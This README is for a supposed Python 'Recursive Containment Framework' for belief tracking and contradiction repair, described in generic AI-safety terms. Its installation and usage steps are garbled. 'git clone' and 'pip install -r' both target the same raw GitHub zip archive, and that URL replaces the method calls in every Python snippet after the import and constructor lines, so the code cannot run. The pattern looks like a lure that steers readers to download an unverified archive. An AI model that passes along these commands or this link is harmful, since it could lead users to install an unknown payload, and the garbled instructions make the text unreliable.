## Introduction

The Recursive Containment Framework (RCF) aims to enhance cognitive systems by providing tools for alignment, belief tracking, and contradiction repair. This framework is designed for researchers and developers interested in AI safety and cognitive systems. By utilizing recursive modeling techniques, RCF allows for self-correction and effective identity modeling.

## Features

- **Cognitive Coherence**: Ensures that beliefs within a system remain consistent and aligned.
- **Belief Tracking**: Monitors and updates beliefs over time to reflect new information.
- **Contradiction Repair**: Identifies and resolves inconsistencies in beliefs.
- **Recursive Modeling**: Uses recursive techniques to build complex models that adapt over time.
- **Internal Alignment**: Focuses on aligning internal processes with external goals.
- **Pseudonymous Research**: Encourages collaborative research while maintaining user privacy.
- **Systems Architecture**: Provides a structured approach to building cognitive systems.

## Topics

This framework covers a range of important topics, including:

- AI Safety
- Alignment
- Belief Tracking
- Cognitive Systems
- Containment
- Identity Modeling
- Internal Alignment
- Pseudonymous Research
- Recursive Modeling
- Self-Correction
- Systems Architecture

## Installation

To install the Recursive Containment Framework, follow these steps:

1. Clone the repository:

   ```bash
   git clone https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip
   ```

2. Navigate to the project directory:

   ```bash
   cd recursive-containment-framework
   ```

3. Install the required dependencies:

   ```bash
   pip install -r https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip
   ```

4. Ensure that you have the necessary environment variables set up.

## Usage

To use the Recursive Containment Framework, follow these steps:

1. Import the necessary modules in your Python script:

   ```python
   from rcf import BeliefTracker, ContradictionRepair
   ```

2. Create an instance of the `BeliefTracker`:

   ```python
   tracker = BeliefTracker()
   ```

3. Add beliefs to the tracker:

   ```python
   https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip("The sky is blue.")
   ```

4. Check for contradictions:

   ```python
   contradictions = https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip()
   ```

5. Repair contradictions if found:

   ```python
   if contradictions:
       repair = ContradictionRepair()
       https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip(contradictions)
   ```
